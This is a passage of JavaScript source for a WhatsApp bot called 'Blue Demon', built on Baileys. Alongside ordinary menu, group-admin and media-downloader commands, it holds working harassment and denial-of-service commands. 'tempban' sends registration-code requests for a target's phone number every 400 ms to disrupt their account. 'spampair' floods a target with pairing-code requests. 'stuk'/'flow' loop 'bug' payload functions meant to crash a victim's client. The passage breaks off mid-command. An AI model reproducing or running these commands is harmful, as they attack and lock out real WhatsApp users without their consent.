│ ⑄ ᴛɪᴋᴛᴏᴋ
│ ⑄ ꜰᴀᴄᴇʙᴏᴏᴋ 
│ ⑄ ɪɴꜱᴛᴀɢʀᴀᴍ 
│ ⑄ ʏᴛꜱᴇᴀʀᴄʜ
│ ⑄ ʏᴛꜱ
│ ⑄ ᴘʟᴀʏ 
│ ⑄ ꜱᴏɴɢ
│ ⑄ ʏᴛᴠɪᴅᴇᴏꜱ 
│ ⑄ ꜱᴘᴏᴛɪꜰʏ 
│ ⑄ ʟʏʀɪᴄꜱ
┗─────────────❐

┏─『 \`𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ɢᴄʟɪɴᴋ
│ ⑄ ꜱᴠᴄᴏɴᴛᴀᴄᴛ 
│ ⑄ ʜɪᴅᴇᴛᴀɢ
│ ⑄ ᴛᴀɢ 
│ ⑄ ᴛᴀɢᴀʟʟ 
│ ⑄ ᴀᴅᴅ
│ ⑄ ᴋɪᴄᴋ 
│ ⑄ ᴘʀᴏᴍᴏᴛᴇ 
│ ⑄ ᴅᴇᴍᴏᴛᴇ 
│ ⑄ ᴍᴜᴛᴇ
│ ⑄ ᴜɴᴍᴜᴛᴇ
│ ⑄ ɪɴᴠɪᴛᴇ 
│ ⑄ ʟᴇᴀᴠᴇɢᴄ
│ ⑄ ᴄʟᴏꜱᴇɢᴄ
│ ⑄ ᴏᴘᴇɴɢᴄ
┗─────────────❐

┏─『 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ᴜᴘᴅᴀᴛᴇ
│ ⑄ ᴇɴᴄ <ᴄᴏᴅᴇ>
│ ⑄ ᴇɴᴄʀʏᴘᴛ <ᴄᴏᴅᴇ>
│ ⑄ ᴀɪ 
│ ⑄ ᴠᴠ
│ ⑄ ɢᴇᴛꜱᴇꜱꜱɪᴏɴ 
│ ⑄ ᴀᴜᴛᴏꜱᴛᴀᴛᴜꜱ
│ ⑄ ʟɪꜱᴛʙʟᴏᴄᴋ 
│ ⑄ ᴅᴇᴠɪᴄᴇ 
│ ⑄ ɢᴇᴛɪᴘ
│ ⑄ ᴛᴏᴛᴀʟᴄᴍᴅ
│ ⑄ ʀᴜɴᴛɪᴍᴇ 
│ ⑄ ᴛɪᴍᴇ 
┗─────────────❐


┏─『 \`𝐅𝐔𝐍 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ʜᴅᴠɪᴅᴇᴏ
│ ⑄ ꜱᴛɪᴄᴋᴇʀ 
│ ⑄ ʟᴏᴠᴇ
│ ⑄ ᴀɴɢʀʏ
│ ⑄ ᴄᴏɴꜰᴜꜱᴇ
┗─────────────❐

┏─『 \`𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔\` 』
│ ⑄ ᴡʀɪᴛᴇᴛᴇxᴛ 
│ ⑄ ᴀᴅᴠᴀɴᴄᴇɢʟᴏᴡ
│ ⑄ ɢʟɪᴛᴄʜ
│ ⑄ ᴘɪxᴇʟɢʟɪᴛᴄʜ
│ ⑄ ꜰʟᴀɢᴛᴇxᴛ
│ ⑄ ɢʟᴏᴡɪɴɢᴛᴇxᴛ
│ ⑄ ʟᴏɢᴏᴍᴀᴋᴇʀ
│ ⑄ ᴄᴀʀᴛᴏᴏɴꜱᴛʏʟᴇ
│ ⑄ ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ
│ ⑄ 
│ ⑄ 
┗─────────────❐
`;

                let listMessage = {
                    title: '𝗠𝗘𝗡𝗨͖',
                    buttonText: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
                    sections: []
                };

                let freesex = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    externalAdReply: {
                                        showAdAttribution: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: allmenu
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: ''
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    hasMediaAttachment: true,
                                    ...(await prepareWAMessageMedia({
                                        image: await fs.readFileSync("./database/image/xbug.jpg")
                                    }, {
                                        upload: zyn.waUploadToServer
                                    }))
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [{
                                        "name": "cta_url",
                                        "buttonParamsJson": "{\"display_text\":\"𝗕𝗟𝗨𝗘 𝗗𝗘𝗠𝗢𝗡\",\"url\":\"https://wa.me/2347041039367\",\"merchant_url\":\"https://wa.me/2347041039367\"}"
                                    }]
                                })
                            })
                        }
                    }
                }, {
                    userJid: m.sender,
                    quoted: m
                });

                await zyn.relayMessage(freesex.key.remoteJid, freesex.message, {
                    messageId: freesex.key.id
                });
            }
            break;
case 'specialmenu': {
                const version = require("baileys/package.json").version;
                let run = runtime(process.uptime());

                const allmenu = `┏━━ ｢ \`ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ\` ｣ ━━❐
┃✾ᐉ 𝐍𝐚𝐦𝐞 : *${pushname}*
┃✾ᐉ 𝐑𝐮𝐧 : *${run}*
┃✾ᐉ 𝐏𝐫𝐞𝐟𝐢𝐱 : *${prefix}*
┃✾ᐉ 𝐌𝐨𝐝𝐞 : *${currentMode}*
┃✾ᐉ 𝐓𝐢𝐦𝐞 : *${time2}*
┗━━━━━━━━━━━━━━━━━━❐

┏─『 \`𝐒𝐏𝐄𝐂𝐈𝐀𝐋𝐌𝐄𝐍𝐔\` 』
│ ⑄ ᴛᴇᴍᴘʙᴀɴ
│ ⑄ ᴀɴᴛɪʙᴜɢᴏɴ
│ ⑄ ᴀɴᴛɪʙᴜɢᴏꜰꜰ 
│ ⑄ ꜱᴘᴀᴍᴘᴀɪʀ
│ ⑄ ʙᴀɴɴᴜᴍ
┗─────────────❐

`;

                let listMessage = {
                    title: '𝗠𝗘𝗡𝗨͖',
                    buttonText: '𝐀𝐥𝐥 𝐌𝐞𝐧𝐮',
                    sections: []
                };

                let freesex = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.create({
                                contextInfo: {
                                    mentionedJid: [m.sender],
                                    externalAdReply: {
                                        showAdAttribution: true
                                    }
                                },
                                body: proto.Message.InteractiveMessage.Body.create({
                                    text: allmenu
                                }),
                                footer: proto.Message.InteractiveMessage.Footer.create({
                                    text: ''
                                }),
                                header: proto.Message.InteractiveMessage.Header.create({
                                    hasMediaAttachment: true,
                                    ...(await prepareWAMessageMedia({
                                        image: await fs.readFileSync("./database/image/xbug.jpg")
                                    }, {
                                        upload: zyn.waUploadToServer
                                    }))
                                }),
                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                    buttons: [{
                                        "name": "cta_url",
                                        "buttonParamsJson": "{\"display_text\":\"𝗕𝗟𝗨𝗘 𝗗𝗘𝗠𝗢𝗡\",\"url\":\"https://wa.me/2347041039367\",\"merchant_url\":\"https://wa.me/2347041039367\"}"
                                    }]
                                })
                            })
                        }
                    }
                }, {
                    userJid: m.sender,
                    quoted: m
                });

                await zyn.relayMessage(freesex.key.remoteJid, freesex.message, {
                    messageId: freesex.key.id
                });
            }
            break;
case "addowner":
                if (!isOwner) return reply(mess.only.owner)
                if (!args[0]) return reply(`Usage ${prefix+command} number\nExample ${prefix+command} 62×××`)
                bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
                let ceknye = await zyn.onWhatsApp(bnnd + `@s.whatsapp.net`)
                if (ceknye.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
                ownerNumber.push(bnnd)
                fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
                reply(`${bnnd} Has become an owner!!!`)
                break
case "delowner":
                if (!isOwner) return reply(mess.only.owner)
                if (!args[0]) return reply(`usage ${prefix+command} number\nExample ${prefix+command} 62×××`)
                ya = q.split("|")[0].replace(/[^0-9]/g, '')
                unp = ownerNumber.indexOf(ya)
                ownerNumber.splice(unp, 1)
                fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
                reply(`${ya} Has Been Deleted by Owner!!!`)
                break
            
case 'gclink':
            case 'grouplink':
            case 'gruplink': {
                if (!m.isGroup) return reply(mess.only.group);
                try {
                    let response = await zyn.groupInviteCode(m.chat);
                    let groupMetadata = await zyn.groupMetadata(m.chat);

                    let groupInfo = `👥 *GROUP LINK*\n` +
                        `📛 *Name :* ${groupMetadata.subject}\n` +
                        `👤 *Group Owner :* ${groupMetadata.owner ? '+' + groupMetadata.owner.split`@`[0] : 'Not known'}\n` +
                        `🌱 *ID :* ${groupMetadata.id}\n` +
                        `🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n` +
                        `👥 *Member :* ${groupMetadata.participants.length}\n`;

                    await zyn.sendText(m.chat, groupInfo, m);
                } catch (error) {
                    console.error('Error fetching group link:', error);
                    return reply('Failed to retrieve the group link.');
                }
            }
            break;
            case 'block': {
                if (!isOwner) return reply(mess.only.owner);

                let users;

                if (isGroup) {
                    // In a group, block the sender of the quoted message or the number from the input text
                    if (m.quoted && m.quoted.sender) {
                        users = m.quoted.sender;
                    } else if (text) {
                        users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    }
                } else {
                    // In a private chat, block the other person's number
                    users = m.chat;
                }

                if (users) {
                    // Ensure the number is not an empty string and contains valid characters
                    if (users.replace(/[^0-9]/g, '').length < 7) {
                        return reply('Invalid number. Please provide a valid number.');
                    }

                    // Block the user
                    await zyn.updateBlockStatus(users, "block");
                    bluereply(mess.success);
                } else {
                    reply("Please reply to the message or input the number you want to block.");
                }
                break;
            }
            case 'clearchat':
            case 'clear': {
                if (!isOwner) return bluereply(mess.only.owner);

                zyn.chatModify({
                        delete: true,
                        lastMessages: [{
                            key: m.key,
                            messageTimestamp: m.messageTimestamp
                        }]
                    },
                    m.chat
                );

                bluereply(mess.success);
            }
            break;
case 'getowner': {
                if (!isOwner) return reply(mess.only.owner);

                // Read the owner list from the JSON file
                let ownerList;
                try {
                    ownerList = JSON.parse(fs.readFileSync('./database/dtbs/owner.json', 'utf8'));
                } catch (error) {
                    return reply("Failed to read the owner list.");
                }

                // Check if the owner list is empty
                if (ownerList.length === 0) {
                    return reply("No owner found.");
                }

                // Create a message with the list of owners
                const ownerMessage = `List of Owners:\n${ownerList.map(num => `- ${num}`).join('\n')}`;

                // Send the message
                reply(ownerMessage);
            }
            break;
case 'getprem': {
                if (!isOwner) return reply(mess.only.owner);

                // Read the premium list from the JSON file
                let premiumList;
                try {
                    premiumList = JSON.parse(fs.readFileSync('./database/dtbs/premium.json', 'utf8'));
                } catch (error) {
                    return reply('Failed to read the premium list.');
                }

                // Check if the premium list is empty
                if (premiumList.length === 0) {
                    return reply('No premium users found.');
                }

                // Create a message with the list of premium users
                const premiumMessage = `*Premium List*\n\n` +
                    `${premiumList.map(num => `- ${num}`).join('\n')}\n\n` +
                    `*Total: ${premiumList.length}*`;

                // Send the message
                await zyn.sendText(m.chat, premiumMessage, m);
                break;
            }
case "delowner":
                if (!isOwner) return reply(mess.only.owner)
                if (!args[0]) return reply(`usage ${prefix+command} number\nExample ${prefix+command} 62×××`)
                ya = q.split("|")[0].replace(/[^0-9]/g, '')
                unp = ownerNumber.indexOf(ya)
                ownerNumber.splice(unp, 1)
                fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
                reply(`${ya} Has Been Deleted by Owner!!!`)
                break
case 'public': {
                if (!isOwner) return reply(mess.only.owner)
                zyn.public = true
                reply(' *\`Public mode activated\`* ')
            }
            break
case 'self': {
                if (!isOwner) return reply(mess.only.owner)
                zyn.public = false
                reply(' *\`Private mode activated\`* ')
            }
            break
case 'ping': {
                // Capture the start time for ping calculation
                const startTime = performance.now();

                // Send a preliminary message to notify that the ping is being measured
                const pingMsg = await zyn.sendMessage(m.chat, {
                    text: '𝐑𝐞𝐚𝐝𝐢𝐧𝐠 𝐩𝐢𝐧𝐠 ⫸'
                });

                // Capture the end time after the message is sent
                const endTime = performance.now();
                const latensi = (endTime - startTime).toFixed(3); // Calculate the latency in milliseconds

                // Relay an edited message with the calculated ping
                await zyn.relayMessage(m.chat, {
                    protocolMessage: {
                        key: pingMsg.key,
                        type: 14, // Protocol type for editing messages
                        editedMessage: {
                            conversation: `*ᴅᴇᴍᴏɴ ʙᴜɢ ꜱᴩᴇᴇᴅ ${latensi} ᴍꜱ*`
                        }
                    }
                }, {});
            }
            break;
case 'unblock': {
                if (!isOwner) return reply(mess.only.group);

                let users;

                if (isGroup) {
                    // In a group, unblock the sender of the quoted message or the number from the input text
                    users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                } else {
                    // In a private chat, unblock the other person's number
                    users = m.chat;
                }

                if (users) {
                    // Ensure the number is not an empty string and contains valid characters
                    if (users.replace(/[^0-9]/g, '').length < 7) {
                        return reply('Invalid number. Please provide a valid number.');
                    }

                    // Unblock the user
                    await zyn.updateBlockStatus(users, "unblock");
                    reply(`Successfully unblocked user ${users.split("@")[0]}`);
                } else {
                    reply("Please reply to the message or input the number you want to unblock.");
                }
                break;
            }
case 'mode': {
                // Check if the user has the right to change the mode (Only creator or bot owner)
                if (!isOwner) return reply(mess.only.owner);

                // Toggle between public and private modes
                if (q === 'public') {
                    zyn.public = true; // Set to public mode
                    reply("*[sᴜᴄᴄᴇss]* *ᴩᴜʙʟɪᴄ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ😊*");
                } else if (q === 'self' || q === 'private') {
                    zyn.public = false; // Set to private mode
                    reply("*[sᴜᴄᴄᴇss]* *ᴩʀɪᴠᴀᴛᴇ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ😊*");
                } else {
                    // Display current mode
                    let currentMode = zyn.public ? 'ᴩᴜʙʟɪᴄ' : 'ᴩʀɪᴠᴀᴛᴇ';
                    reply(`*ᴛʜᴇ ʙᴏᴛ ɪꜱ ᴄᴜʀʀᴇɴᴛʟy ɪɴ ${currentMode} ᴍᴏᴅᴇ*`);
                }
            }
            break;
case 'delete':
            case 'del':
            case 'd': {
                if (!isOwner) return reply(mess.only.owner)
                if (!m.quoted) return; // Exit if there is no quoted message

                try {
                    await zyn.sendMessage(m.chat, {
                        delete: {
                            remoteJid: m.chat,
                            fromMe: false, // This is set to false to delete others' messages
                            id: m.quoted.id,
                            participant: m.quoted.sender // The sender of the quoted message
                        }
                    });
                } catch {
                    // No response or error logging
                }
            }
break
case 'join': {
                if (!isOwner) return reply(mess.owner); // Check if the user is the owner
                if (!text) return reply('Enter Group Link!');
                if (!isUrl(text) || !text.includes('whatsapp.com')) return reply('Invalid Link!');

                const result = text.split('https://chat.whatsapp.com/')[1];
                bluereply(mess.wait);

                try {
                    await zyn.groupAcceptInvite(result);
                    bluereply(mess.success);
                } catch (error) {
                    // Handle different error responses
                    if (error.response) {
                        switch (error.response.status) {
                            case 400:
                                return reply('Group Not Found❗');
                            case 401:
                                return reply('Bot Kicked From The Group❗');
                            case 409:
                                return reply('Bot Has Already Joined the Group❗');
                            case 410:
                                return reply('Group URL Has Been Reset❗');
                            case 500:
                                return reply('Group Is Full❗');
                            default:
                                return reply('An unknown error occurred.');
                        }
                    }
                    reply('An unexpected error occurred.');
                }
                break;
            }
case 'setbio':
            case 'setbotbio': {
                if (!isOwner) return reply(mess.only.owner);
                if (!q) return reply(`*TEXT*`);

                // Sets bot bio/status using zyn
                await zyn.updateProfileStatus(q);
                reply(`*Bio has been changed to ${q}*`);
            }
            break;
case 'restart':
                if (!isOwner) return reply(mess.only.owner)
                reply(`*RESTARTING 𝐁𝐋𝐔𝐄𝐗𝐃𝐄𝐌𝐎𝐍*`)
                await sleep(3000)
                process.exit()
                break
           case 'tiktok':
            case 'tt': {
                if (!text) return reply(`Example: ${prefix + command} link`);
                bluereply(mess.wait);
                try {
                    const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`);
                    const vidnya = data.video.noWatermark;
                    const caption = `*[ TIKTOK DOWNLOADER ]*

\`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname}\`
`;
                    zyn.sendMessage(m.chat, {
                        caption: caption,
                        video: {
                            url: vidnya
                        }
                    }, {
                        quoted: m
                    })
                } catch {
                    const response = await fetchJson(`https://api.tiklydown.eu.org/api/download/v3?url=${encodeURIComponent(text)}`);
                    const videoUrl = response.result.video;
                    const caption = `*[ TIKTOK DOWNLOADER ]*

*Likes*: _${response.result.statistics.likeCount ?? ''}_
*Comments*: _${response.result.statistics.commentCount ?? ''}_
*Shares*: _${response.result.statistics.shareCount ?? ''}_
*By*: _${response.result.author.nickname ?? ''}_

\`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname}\`
        `;
                    zyn.sendMessage(m.chat, {
                        caption: caption,
                        video: {
                            url: videoUrl
                        }
                    }, {
                        quoted: m
                    })
                }
                break;
            }  
        case 'fb':
            case 'facebook':
            case 'facebookvid': {
                if (!text) return reply(`Please send a Facebook video link\n\nEXAMPLE :\n*${prefix + command}* https://fb.watchvhgjhz`)
                bluereply(mess.wait);
                try {
                    const data = await fetchJson(`https://widipe.com/download/fbdl?url=${encodeURIComponent(text)}`)
                    const tex = `*[ 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname} ]*`;
                    const videoBuffer = data.result.HD;
                    zyn.sendMessage(m.chat, {
                        caption: tex,
                        video: {
                            url: videoBuffer
                        }
                    }, {
                        quoted: m
                    });
                } catch (error) {
                    reply('*AN ERROR OCCURED*')
                }
            }
            break        
case 'instagram':
            case 'igdl':
            case 'ig':
            case 'igvideo':
            case 'igimage':
            case 'igvid':
            case 'igimg': {
                if (!text) return reply(`You need to provide the URL of any Instagram video, post, reel, image`)
                bluereply(mess.wait)
                try {
                    const data = await fetchJson(`https://widipe.com/download/igdl?url=${encodeURIComponent(text)}`);
                    if (data && data.result && data.result.length > 0 && data.result[0].url) {
                        const hasil = data.result[0].url;
                        const cap = `𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐃 𝐁𝐘 ${botname}`;
                        zyn.sendMessage(m.chat, {
                            video: {
                                url: hasil
                            },
                            caption: cap
                        }, {
                            quoted: m
                        });
                    } else {
                        throw new Error('URL not found in result');
                    }
                } catch (error) {
                    console.log("AN ERROR OCCURED");
                }
            }
            break
case 'yts':
            case 'ytsearch': {
                if (!text) return reply(`Example : ${prefix + command} Demon slayer`);
                bluereply(mess.wait);
                const yts = require("yt-search");
                let search = await yts(text);
                let teks = `YouTube Search\n\nResults for: *${text}*\n\n`;
                let no = 1;

                for (let i of search.all) {
                    teks += `${themeemoji} No : ${no++}\n${themeemoji} Type : ${i.type}\n${themeemoji} Video ID : ${i.videoId}\n${themeemoji} Title : ${i.title}\n${themeemoji} Views : ${i.views}\n${themeemoji} Duration : ${i.timestamp}\n${themeemoji} Uploaded : ${i.ago}\n${themeemoji} Url : ${i.url}\n\n─────────────────\n\n`;
                }

                zyn.sendMessage(m.chat, {
                    image: {
                        url: search.all[0].thumbnail
                    },
                    caption: teks
                }, {
                    quoted: m
                });
                break;
            }
case 'spotify':
            case 'play':
            case 'song': {
                if (!text) return reply('Enter the song title!')
                let result = await searchSpotify(text)
                let caption = result.map((v, i) => {
                    return {
                        header: "",
                        title: v.name,
                        description: `${botname} 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑.....`,
                        id: '.spdl ' + v.link
                    }
                })
                let msg = generateWAMessageFromContent(m.chat, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: {
                                body: {
                                    text: `*🔎 Search Results From* ${text}\n*Please select the list below*`,
                                },
                                footer: {
                                    text: 'ᴅᴇᴍᴏɴ ᴛᴇᴄʜ'
                                },
                                header: {
                                    title: "MUSIC - SEARCH",
                                    subtitle: "",
                                    hasMediaAttachment: false,
                                },
                                nativeFlowMessage: {
                                    buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: JSON.stringify({
                                            title: "CLICK HERE",
                                            sections: [{
                                                title: "",
                                                rows: caption
                                            }]
                                        })
                                    }]
                                }
                            }
                        }
                    }
                }, {
                    quoted: m
                }, {});
                await zyn.relayMessage(msg.key.remoteJid, msg.message, {
                    messageId: msg.key.id
                });
            }
            break
case 'spdl':
            case 'spotifydl': {
                if (!text) return reply('Enter Link')
                let result = await spotifydl(text)
                let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nᴅᴇᴍᴏɴ ʙᴜɢ`
                const p = await new canvafy.Spotify()
                    .setTitle(result.title)
                    .setAuthor("𝐒𝐏𝐎𝐓𝐈𝐅𝐘 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃𝐄𝐑")
                    .setTimestamp(40, 100)
                    .setOverlayOpacity(0.8)
                    .setBorder("#fff", 0.8)
                    .setImage(result.image)
                    .setBlur(3)
                    .build();

                await zyn.sendMessage(from, {
                    image: p,
                    caption: captionvid
                }, {
                    quoted: m
                })
                zyn.sendMessage(m.chat, {
                    audio: {
                        url: result.download
                    },
                    mimetype: 'audio/mpeg',
                    filename: 'MP3 BY ' + 'ᴅᴇᴍᴏɴ-ʙᴜɢ'
                }, {
                    quoted: m
                });
            }
            break
case 'ytvideo':
            case 'ytmp4': {
                if (!text) return reply(' [ Example ] :*\n> *.ytmp4 <link youtube>*')
                bluereply(mess.wait)
                try {
                    reply('*The video sending process may take 1-3 minutes if the video is too long!*')
                    let proces = await (await fetch(`https://widipe.com/download/ytdl?url=${text}`)).json()
                    let video4 = proces.result.mp4;
                    const ytc = `*[ YOUTUBE DOWNLOADER ]*
  *title* ${proces.result.title}
  
  ©${botname}`;
                    zyn.sendMessage(m.chat, {
                        video: {
                            url: video4
                        },
                        caption: ytc
                    }, {
                        quoted: m
                    })
                } catch (e) {
                    reply('*an error occurred :*' + e);
                }
            }
            break
case 'lirik':
            case 'lyrics': {
                try {
                    if (!text) return reply(`What lyrics are you looking for?\nExample usage: ${prefix}lyrics Thunder`);
                    bluereply(mess.wait);

                    // Fetch lyrics
                    const hasil = await fetchJson(`https://widipe.com/lirik?text=${encodeURIComponent(text)}`);
                    const xeonlirik = `
*Title :* ${hasil.result.title}
*Artist:* ${hasil.result.artist}
*Url :* ${hasil.result.url}

*Lyrics :* ${hasil.result.lyrics}
        `.trim();

                    // Prepare image for header
                    const headerMedia = await prepareWAMessageMedia({
                        image: fs.readFileSync('./database/image/xbug.jpg')
                    }, {
                        upload: zyn.waUploadToServer
                    });

                    // Create interactive message
                    const interactiveMessage = {
                        viewOnceMessage: {
                            message: {
                                messageContextInfo: {
                                    deviceListMetadata: {},
                                    deviceListMetadataVersion: 2
                                },
                                interactiveMessage: proto.Message.InteractiveMessage.create({
                                    body: proto.Message.InteractiveMessage.Body.create({
                                        text: botname
                                    }),
                                    footer: proto.Message.InteractiveMessage.Footer.create({
                                        text: xeonlirik
                                    }),
                                    header: proto.Message.InteractiveMessage.Header.create({
                                        hasMediaAttachment: true,
                                        ...headerMedia
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                        buttons: [{
                                            name: "quick_reply",
                                            buttonParamsJson: `{\"display_text\":\"${botname}\",\"id\":\"lyrics_reply\"}`
                                        }]
                                    }),
                                    contextInfo: {
                                        mentionedJid: [m.sender],
                                        forwardingScore: 999,
                                        isForwarded: true,
                                        forwardedNewsletterMessageInfo: {
                                            newsletterJid: '120363303045895814@newsletter',
                                            newsletterName: botname,
                                            serverMessageId: 143
                                        }
                                    }
                                })
                            }
                        }
                    };

                    // Generate and send the interactive message
                    const msgs = generateWAMessageFromContent(m.chat, interactiveMessage, {
                        quoted: m
                    });
                    await zyn.relayMessage(m.chat, msgs.message, {
                        messageId: msgs.key.id
                    });

                } catch (error) {
                    reply(`An error occurred: ${error.message}`);
                }
                break;
            }




































































































































































































case 'infono': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
if (!q) return reply(' Enter the Target number Prefix "+" and Country Code')
await zyn.sendMessage(m.chat, {text: `informasi kontak
Name : ${m.pushName}
Number : ${q}
Status : *${zyn ? '✅' : `❌`}*`},{quoted: m})
}
break



case 'tempban': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
if (!text) return reply(`Example: ${prefix + command} 62|8xxx`)
if (!/|/.test(text)) return reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|8xxx`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await reply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'spampair': {
const usePairingCode = true
const NodeCache = require("node-cache")
const resolveMsgBuffer = new NodeCache()
			if (!isOwner) return
			if (!q) return reply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 62xx_`)
			let [peenis, pepekk = "200"] = q.split("|")
			await reply(`</> 𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️`)
			await reaction(m.chat, "✅")
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys')
			let {
				state
			} = await useMultiFileAuthState('pairSess')
			let {
				version
			} = await fetchLatestBaileysVersion()
			let sucked = await makeWaSocket({
				auth: state,
				browser: ['Mac Os', 'chrome', '121.0.6167.159'],
version: [2, 2413, 1],
keepAliveIntervalMs: 50000,
printQRInTerminal: !usePairingCode,
generateHighQualityLinkPreview: true,
resolveMsgBuffer,
				logger: pino({ level: "silent" }),
					level: 'fatal'
				})
			for (let i = 0; i < pepekk; i++) {
			await sleep(2000)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(2000)
		}
		break

case 'antibugon': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!") 
global.antibug = true
return reply('sukses mengaktifkan antibug')
}
break

case 'antibugoff': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!") 
global.antibug = false
return reply('sukses menonaktifkan antibug')
}
break

case 'clearchat': {
pee = "\n".repeat(1000)
return reply(pee + '😁🖕')
}
break

case 'katakatajack': {
if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
await zyn.sendMessage(m.chat, {text: `tetaplah semangat jangan putus asa karna kejamnya dunia ini paham!!! by JALLMODS`},{quoted: m})
sleep(2000)
return reply(`🥶`)
}
break

case "sticker": 
case "stiker":
case "s": {
if (!isOwner) return reply(mess.only.owner)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await zyn.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await zyn.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break

case 'stuk': case 'flow': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await buk1(zyn, target, "p", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(zyn, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(zyn, target, wanted)
}
reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
break

case 'fuck': case 'tzy': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
